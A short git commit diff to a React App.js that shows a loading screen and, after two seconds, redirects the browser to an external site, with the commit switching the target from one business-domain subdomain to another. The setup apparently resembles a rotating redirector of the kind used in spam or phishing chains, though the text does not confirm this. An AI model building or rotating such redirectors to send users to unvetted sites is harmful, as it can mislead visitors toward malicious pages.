842b426b6febb3e92e398987e7e68e292159bea3
husknet <127146284+husknet@users.noreply.github.com>
2024-10-10 13:16:45 -0300

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://rock.abacusstar.com.au';
+            window.location.href = 'https://rock.rigaprecast.com.au';
         }, 2000);
 
         return () => clearTimeout(timer);
